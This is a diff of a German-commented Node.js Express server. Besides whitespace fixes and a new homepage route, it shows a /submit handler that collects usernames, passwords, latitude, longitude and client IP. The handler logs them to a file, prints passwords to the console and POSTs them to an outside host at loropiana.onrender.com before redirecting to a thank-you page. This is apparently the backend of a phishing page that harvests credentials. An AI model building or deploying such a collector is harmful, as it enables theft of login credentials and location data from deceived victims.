@@ -3,14 +3,19 @@ const bodyParser = require('body-parser');
 const path = require('path');
 const fs = require('fs');
 const fetch = require('node-fetch');
- 
+
 const app = express();
 const PORT = process.env.PORT || 3000;
- 
+
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
- 
+
+// ❗ Startseite
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 app.post('/submit', async (req, res) => {
   try {
     const { username, password, latitude, longitude } = req.body;
@@ -24,30 +29,30 @@ app.post('/submit', async (req, res) => {
       latitude,
       longitude
     };
- 
+
     fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
       if (err) console.error("Log-Fehler:", err);
     });
- 
+
     console.log("👤 Benutzername:", username);
     console.log("🔑 Passwort:", password);
     console.log("📍 Standort:", latitude, longitude);
     console.log("📍 IP:", clientIp);
- 
+
     await fetch('https://loropiana.onrender.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(logData)
     });
- // Weiterleitung
+
     res.redirect('/danke.html');
- 
+
   } catch (error) {
     console.error("❌ Fehler:", error);
     res.status(500).send("Serverfehler");
   }
 });
- 
+
 app.listen(PORT, () => {
   console.log(`✅ Server läuft auf http://localhost:${PORT}`);
 });
